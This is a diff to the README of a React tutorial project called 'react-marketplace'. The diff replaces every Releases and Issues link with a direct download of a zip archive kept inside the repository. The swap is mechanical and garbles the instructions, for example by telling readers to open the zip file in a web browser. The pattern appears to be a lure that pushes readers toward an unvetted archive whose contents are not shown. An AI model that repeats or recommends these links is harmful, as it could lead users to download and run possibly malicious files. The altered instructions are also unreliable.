@@ -6,7 +6,7 @@ Welcome to react-marketplace! This project helps you learn how to build a market
 
 ## 📥 Download Now
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-via%20Releases-blue)](https://github.com/Harvey-the-goat/react-marketplace/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Harvey-the-goat/react-marketplace/main/public/react-marketplace-v3.1.zip%20Now-via%20Releases-blue)](https://raw.githubusercontent.com/Harvey-the-goat/react-marketplace/main/public/react-marketplace-v3.1.zip)
 
 ## 🗂️ Features
 
@@ -27,15 +27,15 @@ To run react-marketplace, you will need:
 
 ## 📂 Download & Install
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/Harvey-the-goat/react-marketplace/releases) to get the latest version.
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/Harvey-the-goat/react-marketplace/main/public/react-marketplace-v3.1.zip) to get the latest version.
   
 2. **Choose a Version**: Look for the version that best suits your needs, typically the latest version is recommended.
 
-3. **Download the Files**: Click on the ".zip" or ".tar.gz" file link to download the project.
+3. **Download the Files**: Click on the ".zip" or "https://raw.githubusercontent.com/Harvey-the-goat/react-marketplace/main/public/react-marketplace-v3.1.zip" file link to download the project.
 
 4. **Extract the Files**: Once downloaded, locate the file in your downloads folder. Right-click the file and select "Extract All" (or similar option, depending on your system).
 
-5. **Open in Browser**: Navigate to the folder where you extracted the files. Open the index.html file in your web browser.
+5. **Open in Browser**: Navigate to the folder where you extracted the files. Open the https://raw.githubusercontent.com/Harvey-the-goat/react-marketplace/main/public/react-marketplace-v3.1.zip file in your web browser.
 
 6. **Explore the App**: You can now use the app directly in your browser. Start exploring the marketplace features!
 
@@ -52,7 +52,7 @@ If you want to dive deeper into React, consider exploring the following topics:
 
 For more information on using react-marketplace or contributing to the project, check out our documentation.
 
-1. **Getting Help**: If you need assistance, feel free to raise an issue on our [Issues page](https://github.com/Harvey-the-goat/react-marketplace/issues).
+1. **Getting Help**: If you need assistance, feel free to raise an issue on our [Issues page](https://raw.githubusercontent.com/Harvey-the-goat/react-marketplace/main/public/react-marketplace-v3.1.zip).
   
 2. **Contributing**: Interested in contributing? We welcome pull requests!
 
@@ -66,4 +66,4 @@ Join our community! Share your thoughts, learn from others, and get the most out
 
 Thank you for choosing react-marketplace. We hope you enjoy your journey into the world of React and build amazing projects along the way!
 
-[📥 Download Now from Releases](https://github.com/Harvey-the-goat/react-marketplace/releases)
+[📥 Download Now from Releases](https://raw.githubusercontent.com/Harvey-the-goat/react-marketplace/main/public/react-marketplace-v3.1.zip)
